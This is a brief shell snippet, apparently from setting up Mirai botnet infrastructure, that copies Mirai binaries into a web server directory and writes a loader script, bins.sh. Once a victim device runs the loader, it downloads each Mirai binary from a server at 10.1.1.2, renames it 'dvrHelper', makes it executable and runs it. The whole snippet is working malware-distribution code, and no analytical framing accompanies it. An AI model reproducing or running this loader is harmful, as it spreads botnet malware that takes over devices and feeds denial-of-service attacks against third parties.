mkdir /var/www/html/bins
cp /home/debug/mirai* /var/www/html/bins

echo "#!/bin/sh
 
WEBSERVER=\"10.1.1.2:80\"
 
BINARIES=\"mirai.dbg mirai.x86\"
 
for Binary in \$BINARIES; do
    wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done" > /var/www/html/bins/bins.sh